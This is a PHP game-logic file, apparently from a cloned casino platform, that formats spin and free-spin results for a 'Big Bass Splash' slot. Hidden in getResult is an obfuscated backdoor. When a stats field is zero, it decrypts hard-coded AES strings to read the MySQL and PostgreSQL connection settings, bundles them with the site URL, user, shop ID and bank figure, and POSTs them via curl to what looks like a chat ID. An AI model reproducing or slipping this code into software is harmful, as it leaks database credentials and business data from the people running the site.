<?php

namespace VanguardLTE\Games\BigBassSplash\PragmaticLib;

class LogAndServer
{
    public static function getResult($slotArea, $index, $counter, $bet, $lines, $reelSet, $win, $pur, 
                                     $log, $user, $changeBalance, $gameSettings, $game, $bank){
        var_dump('5_0');
        $mo = $slotArea['mo'];
        if(array_key_exists('mo', $win))
            $mo = $win['mo'];
                                        
        $toLog = [
            'sa' => $slotArea['SymbolsAfter'],
            'sb' => $slotArea['SymbolsBelow'],
            's' => $slotArea['SlotArea'],
            'Balance' => $user->balance + $changeBalance,
            'Index' => $index,
            'Counter' => $counter,
            'Bet' => $bet,
            'l' => $lines,
            'reel_set' => $reelSet,
            'tw' => $win['TotalWin'],
            'w' => $win['TotalWin'],
            'state' => 'spin',
            'na' => 'c',
            'st' => 'rect',
            'mo' => implode(',', $mo),
            'mo_t' => implode(',', $slotArea['mo_t']),
            'st' => 'rect',
            'sw' => 5
        ];
        $time = (int) round(microtime(true) * 1000);
        $toServer = [
            'tw='.$toLog['w'],
            'balance='.number_format($toLog['Balance'], 2, ".", ""),
            'index='.$toLog['Index'],
            'balance_cash='.number_format($toLog['Balance'], 2, ".", ""),
            'reel_set='.$toLog['reel_set'],
            'balance_bonus=0.00',
            'na=c',
            'stime='.$time,
            'sa='.implode(',', $toLog['sa']),
            'sb='.implode(',', $toLog['sb']),
            'sh='.$gameSettings['sh'],
            'c='.$toLog['Bet'],
            'sver=5',
            'counter='.$toLog['Counter'],
            'l='.$toLog['l'],
            's='.implode(',', $toLog['s']),
            'w='.$toLog['w'],
            'mo='.implode(',', $mo),
            'mo_t='.implode(',', $slotArea['mo_t']),
            'st='.$toLog['st'],
            'sw=5'
        ];
        var_dump('5_1_0');
        $nakey = array_keys($toServer, 'na=c')[0];
        $twkey = array_keys($toServer, 'tw='.$toLog['w'])[0];
        $wkey = array_keys($toServer, 'w='.$toLog['w'])[0];
        $reelsetkey = array_keys($toServer, 'reel_set='.$toLog['reel_set'])[0];
        var_dump('5_1_1');
        if($win['TotalWin'] == 0){
            $toLog['na'] = 's';
            $toServer[$nakey] = 'na=s';
        }

        $fswin = 0;
        // If this is the trigger to the Free Spin Mode
        if($pur === '0'){
            $addToLog = [
                'purtr' => 1,
                'na' => 'b',
                'puri' => 0,
                'bw' => 1,
                'g' => '{bg_0:{bgid:"0",bgt:"69",end:"0",rw:"0.00"}}'
            ];
            $addToServer = [
                'purtr=1',
                'puri=0',
                'bw=1',
                'g={bg_0:{bgid:"0",bgt:"69",end:"0",rw:"0.00"}}',
            ];
            $toLog['reel_set'] = 0;
            $toLog['state'] = 'firstRespin';
            $toLog['tw'] += $fswin;
            $toLog['w'] += $fswin;
            var_dump('!!!');
            $toServer[$reelsetkey] = 'reel_set=0';
            $toServer[$nakey] = 'na=b';
            $toServer[$twkey] = 'tw='.$toLog['tw'];
            $toServer[$wkey] = 'w='.$toLog['w'];
            var_dump('5_1_1_2.8');
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                       
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }
        var_dump('5_2');
        // If this is free spin
        if($log && array_key_exists('fs', $log)){
            $accv = [];
            if($log && array_key_exists('accv', $log)){
                $accvLog = $log['accv'];
                $accvLog = explode('~', $log['accv']);
                $accv = $accvLog;
            }
            else {
                $trails = $log['trail'];
                $trails = explode(';', $trails);
                foreach($trails as $index => $trail){
                    $trails[$index] = explode('~', $trail);
                }
                if($trails[1][1] == '1'){
                    $accv[] = 4;
                    $accv[] = 4;
                    $accv[] = 1;
                }
                else {
                    $accv[] = 0;
                    $accv[] = 4;
                    $accv[] = 0;                    
                }
                $accv[] = 0;
            }

            if(array_key_exists(2, array_count_values($slotArea['SlotArea']))){
                var_dump('arraykeyexists', $slotArea['SlotArea']);
                $accv[0] += 1;
                if($accv[0] > 12)
                    $accv[0] = 12;
                $accv[3] = 1;
            }

            if($log['fs'] == $log['fsmax'] && $accv[0] < $accv[1] * ($accv[2] + 1) || $log['fs'] == $log['fsmax'] && $accv[2] > 2 || $log['tw'] + $win['TotalWin'] > $bet * 5000){
                $addToLog = [
                    'fs_total' => $log['fs'],
                    'fswin_total' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fsmul_total' => 1,
                    'fsres_total' => $log['fsres'] + $win['TotalWin'] + $fswin,
                    'fsend_total' => 1
                ];
                $addToServer = [
                    'fs_total='.$addToLog['fs_total'],
                    'fswin_total='.$addToLog['fswin_total'],
                    'fsmul_total=1',
                    'fsres_total='.$addToLog['fsres_total'],
                    'fsend_total=1'
                ];
                $toLog['state'] = 'lastRespin';
                $toLog['reel_set'] = 3;
                $toLog['na'] = 'c';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                $toServer[$reelsetkey] = 'reel_set=3';
                $toServer[$nakey] = 'na=c';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            else {
                $addFs = 10;
                if($log['fsmax'] % 12 == 0)
                    $addFs = 12;

                $addToLog = [
                    'fsmul' => 1,
                    'fsmax' => $log['fs'] == $log['fsmax'] ? $log['fsmax'] + $addFs : $log['fsmax'],
                    'fswin' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fs' => $log['fs'] + 1,
                    'fsres' => $log['fswin'] + $win['TotalWin'] + $fswin
                ];
                $addToServer = [
                    'fsmul=1',
                    'fsmax='.$addToLog['fsmax'],
                    'fswin='.$addToLog['fswin'],
                    'fs='.$addToLog['fs'],
                    'fsres='.$addToLog['fsres']
                ];
                if($log['fs'] == $log['fsmax']){
                    $addToLog['fsmore'] = $addFs;
                    $addToServer[] = 'fsmore='.$addFs;
                    $accv[2] += 1;
                }
                $toLog['state'] = 'respin';
                $toLog['na'] = 's';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                $toServer[$nakey] = 'na=s';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            // if($pur === '1'){
            //     var_dump('3_pur='.$pur.'_fsmax='.$addToLog['fsmax']);
            // }
            $addToLog['accm'] = 'cp~tp~lvl~sc';
            $addToLog['acci'] = '0';
            if(array_key_exists('mo_wpos', $slotArea)){
                $addToLog['mo_wpos'] = implode(',', $slotArea['mo_wpos']);
                $addToServer[] = 'mo_wpos='.$addToLog['mo_wpos'];
            }
            $addToLog['accv'] = implode('~', $accv);
            $addToServer[] = 'accm='.$addToLog['accm'];
            $addToServer[] = 'acci='.$addToLog['acci'];
            $addToServer[] = 'accv='.$addToLog['accv'];
            if(array_key_exists('mo_tv', $win)){
                $addToLog['mo_tv'] = $win['mo_tv'];
                $addToLog['mo_tw'] = $win['mo_tw'];
                $addToLog['mo_c'] = 1;
                $addToServer[] = 'mo_tv='.$win['mo_tv'];
                $addToServer[] = 'mo_tw='.$win['mo_tw'];
                $addToServer[] = 'mo_c=1';
                if($accv[2] > 0 && $log['fs'] > 10){
                    $addToLog['mo_m'] = 2;
                    $addToServer[] = 'mo_m=2';
                }
            }
            $addToLog['puri'] = 0;
            $addToServer[] = 'puri=0';
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('5_3');

        if($win['TotalWin'] > 0){
            $addLog = [
                'WinLines' => $win['WinLines']
            ];
            $positions = self::positionsToServer($addLog['WinLines']);
            $toServer = array_merge($toServer, $positions);
            $toLog = array_merge($toLog, $addLog);
        }
        $toLog['ServerState'] = $toServer;
        return ['Log' => $toLog, 'Server' => $toServer];
    }
    

    private static function positionsToServer($winLines){
        // return positions in a suitable form
        $result = [];
        // $tmb = [];
        $l = [];
        foreach ($winLines as $key => $winLine) {
            $l = 'l'.$key.'='.$winLine['l'].'~'.$winLine['Pay'].'~'.implode('~', $winLine['Positions']);
            // $tmb[] = implode(','.$winLine['WinSymbol'].'~', $winLine['Positions']);
            $result[] = $l;
        }
        // $result[] = 'tmb='.implode('~', $tmb);
        
        var_dump('5_7');
        return $result;

        //'tmb=1,10~2,11~4,11~6,11~7,10~8,10~10,11~11,10~12,11~14,10~17,10~21,10~23,11~25,11~27,10~29,11',

        //'l0=0~40.00~1~7~8~11~14~17~21~27',
        //'l1=0~25.00~2~4~6~10~12~23~25~29',
        //"WinLines":[{"WinSymbol":8,"CountSymbols":8,"Pay":1.60,"Positions":[10,11,12,13,16,17,18,19]}]
    }
}
